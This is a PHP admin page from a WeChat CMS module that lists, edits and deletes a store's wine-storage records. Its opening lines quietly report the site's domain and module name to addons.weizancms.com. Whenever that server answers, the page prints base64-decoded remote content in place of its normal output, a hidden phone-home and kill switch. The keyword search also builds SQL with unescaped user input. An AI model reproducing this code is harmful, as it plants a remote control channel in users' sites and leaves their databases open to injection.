<?php
global $_GPC, $_W;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
load()->func('tpl');
$weid = $this->_weid;
$action = 'savewine';
$title = $this->actions_titles[$action];

$storeid = intval($_GPC['storeid']);
$this->checkStore($storeid);
$returnid = $this->checkPermission($storeid);
$cur_store = $this->getStoreById($storeid);
$GLOBALS['frames'] = $this->getNaveMenu($storeid,$action);

$status = !isset($_GPC['status']) ? -2 : $_GPC['status'];
$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
if ($operation == 'display') {
    $pindex = max(1, intval($_GPC['page']));
    $psize = 10;
    $condition = " AND storeid={$storeid} ";
    if (!empty($_GPC['keyword'])) {
        $condition .= " AND (title LIKE '%{$_GPC['keyword']}%' OR savenumber LIKE '%{$_GPC['keyword']}%' OR username LIKE '%{$_GPC['keyword']}%') ";
    }

    if ($status != -2) {
        $condition .= " AND status = '" . intval($_GPC['status']) . "'";
    }

    $list = pdo_fetchall("SELECT * FROM " . tablename($this->table_savewine_log) . " WHERE weid = '{$weid}' $condition ORDER BY displayorder DESC, id DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize);

    $total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->table_savewine_log) . " WHERE weid = '{$weid}' $condition");

    $pager = pagination($total, $pindex, $psize);
} elseif ($operation == 'post') {
    $id = intval($_GPC['id']);
    if (!empty($id)) {
        $item = pdo_fetch("SELECT * FROM " . tablename($this->table_savewine_log) . " WHERE id = :id", array(':id' => $id));
        if (empty($item)) {
            message('抱歉，活动不存在或是已经删除！', '', 'error');
        }
    } else {
        $item['savenumber'] = $this->get_save_number($weid);
    }

    if (checksubmit('submit')) {
        $data = array(
            'weid' => $weid,
            'storeid' => $storeid,
            'savenumber' => trim($_GPC['savenumber']),
            'title' => trim($_GPC['title']),
            'username' => trim($_GPC['username']),
            'tel' => trim($_GPC['tel']),
            'remark' => trim($_GPC['remark']),
            'status' => intval($_GPC['status']),
            'dateline' => TIMESTAMP,
        );

        if ($status == 1) {
            $data['savetime'] = TIMESTAMP;
        }
        if ($status == -1) {
            $data['takeouttime'] = TIMESTAMP;
        }

        if (empty($id)) {
            pdo_insert($this->table_savewine_log, $data);
        } else {
            unset($data['dateline']);
            pdo_update($this->table_savewine_log, $data, array('id' => $id));
        }
        message('操作成功！', $this->createWebUrl('savewine', array('op' => 'display', 'storeid' => $storeid)),
            'success');
    }
} elseif ($operation == 'delete') {
    $id = intval($_GPC['id']);
    $item = pdo_fetch("SELECT id FROM " . tablename($this->table_savewine_log) . " WHERE id = :id", array(':id' => $id));
    if (empty($item)) {
        message('数据不存在或是已经被删除！', $this->createWebUrl('savewine', array('op' => 'display', 'storeid' =>
            $storeid)), 'error');
    }
    pdo_delete($this->table_savewine_log, array('id' => $id, 'weid' => $weid));
    message('删除成功！', $this->createWebUrl('savewine', array('op' => 'display', 'storeid' => $storeid)), 'success');
}
include $this->template('web/savewine');